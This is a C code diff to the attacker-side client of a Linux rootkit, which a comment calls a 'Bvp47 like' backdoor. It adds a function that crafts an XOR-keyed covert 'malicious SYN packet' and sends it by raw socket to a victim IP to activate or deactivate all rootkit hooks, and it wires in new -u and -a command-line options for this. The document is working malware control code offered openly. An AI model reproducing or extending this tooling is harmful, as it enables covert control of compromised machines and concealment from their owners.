@@ -188,7 +188,7 @@ void activate_command_control_shell(char* argv){
     free(local_ip);
 }
 
-//Rootkit backdoor V2
+//Rootkit backdoor V2 being used - Bvp47 like
 void activate_command_control_shell_encrypted(char* argv){
     char* local_ip = getLocalIpAddress();
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
@@ -240,9 +240,61 @@ void activate_command_control_shell_encrypted(char* argv){
     }
     
     server_run(8500);
+}
 
+void hook_control_command(char* argv, int mode){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
+    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
+    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1] = {0};
+    srand(time(NULL));
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
+        payload[ii] = (char)rand();
+    }
+    //Follow protocol rules
+    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_1;
+    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_2;
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
+    //K3 with command to start the encrypted connection with the backdoor
+    if(mode == 0){
+        strncpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    }else{
+        strncpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    }
+    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    strncpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key1[ii];
+    }
+    strncpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+
+    strncpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key2[ii];
+    }
+    strncpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+
+    strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
+    }
+
+    strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     
-    
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+        return;
+    }else{
+        printf("["KGRN"OK"RESET"]""Secret message successfully sent! No answer expected\n");
+    }
 }
 
 
@@ -264,7 +316,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:c:e:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:e:u:a:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -296,6 +348,28 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             activate_command_control_shell_encrypted(dest_address);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 'u':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Deactivating all rootkit hooks\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            hook_control_command(dest_address, 0);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 'a':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Activating all rootkit hooks\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            hook_control_command(dest_address, 1);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
